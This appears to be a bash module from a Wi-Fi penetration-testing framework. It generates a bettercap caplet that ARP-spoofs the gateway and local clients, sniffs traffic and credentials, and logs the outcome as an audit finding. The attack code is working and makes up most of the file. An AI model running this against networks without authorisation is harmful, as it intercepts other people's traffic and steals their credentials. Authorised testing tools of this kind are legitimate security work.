#!/usr/bin/env bash
# MODULE_META
# NAME="ARP Spoofing / MITM Test"
# CATEGORY="G"
# DEPS="B1"
# CRITICAL="yes"
# TOOLS="bettercap,ip"
# DESC="Attempt to ARP-spoof the gateway to intercept traffic"
# REQS="managed_iface,gateway_ip"
# PCAP="no"
# TIMED="yes"
# DECODE="mitm_arp_tls"

#===============================================================================
#  modules/g1_arp_spoofing.sh
#  G1: ARP Spoofing / MITM Test (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use 'bettercap' to poison the ARP cache of the gateway and target clients.
#  2. Enable network sniffing to capture credentials and traffic patterns.
#  3. Export a JSON event log for further analysis by the Go brain.
#===============================================================================

set -euo pipefail



# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
GATEWAY="${GATEWAY_IP:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g1"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G1"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

if [[ -z "$GATEWAY" ]]; then
    # Auto-detect if possible
    GATEWAY=$(ip -4 route show dev "${INTERFACE}" | awk '/default/{print $3}' | head -1) || true
fi

echo "[*] Starting ARP spoofing attempt on ${INTERFACE}..."

CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up bettercap processes..."
    [[ -n "${TOOL_PID:-}" ]] && kill "$TOOL_PID" 2>/dev/null || true
    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Use bettercap for ARP spoofing
if command -v bettercap &>/dev/null; then
    echo "[*] Starting bettercap ARP spoofing..."
    
    # Create caplet
    cat <<EOF > "$CAPLET_FILE"
set arp.spoof.targets ${GATEWAY:-}
set arp.spoof.internal true
set arp.spoof.fullduplex true
set events.stream.output $JSON_LOG
set net.sniff.verbose true
set net.sniff.local true
arp.spoof on
net.sniff on
events.stream on
EOF

    # 1. 🛰️ DYNAMIC TELEMETRY HEARTBEAT (Background)
    (
        ELAPSED=0
        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
            PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
            [[ $PERCENT -gt 90 ]] && PERCENT=90
            STATUS="ARP Spoofing in progress... ($(( SCAN_TIME - ELAPSED ))s left)"
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
            sleep 2
            ((ELAPSED+=2))
        done
    ) &
    TEL_PID=$!

    # 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        timeout --foreground "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" 2>&1 | tee "$LOG_FILE" || true
    else
        timeout "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
        TOOL_PID=$!
        wait "$TOOL_PID" || true
    fi

    kill "$TEL_PID" 2>/dev/null || true
    cleanup
    trap - EXIT
    
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 95 --status "Analyzing intercepted traffic..."

    # 2. Reporting
    # Detection: bettercap creates the events JSON on startup regardless of activity.
    # Check the LOG for evidence of actual arp.spoof events or sniffed credentials,
    # not merely file existence.
    if grep -qiE "arp\.spoof|net\.sniff|endpoint\.new|credential" "$LOG_FILE" 2>/dev/null; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "ARP Cache Poisoning Active" \
            --severity HIGH \
            --desc "Successfully executed ARP spoofing (MITM) attack against the gateway (${GATEWAY:-Unknown}) and local clients. Bettercap confirmed ARP poisoning and/or sniffed traffic." \
            --target "${GATEWAY:-Global}" \
            --evidence "$LOG_FILE" \
            --rationale "ARP spoofing allows an attacker to intercept, modify, and redirect all network traffic. This enables lateral movement, data theft (including cleartext credentials), and session hijacking by positioning the attacker as a Man-in-the-Middle (MITM)."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G1] Audit Complete" \
            --severity INFO \
            --desc "ARP spoofing attack cycle finished on $INTERFACE. No ARP poisoning events or intercepted traffic confirmed." \
            --target "${GATEWAY:-Global}" \
            --evidence "$LOG_FILE" \
            --rationale "ARP spoofing may be mitigated by static ARP entries or DAI (Dynamic ARP Inspection) on the switch. This audit confirms the attempt was made and identifies whether immediate interception was successful."
    fi
else
    echo "[!] bettercap not found. Skipping."
    exit 1
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "ARP Spoofing test complete."

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
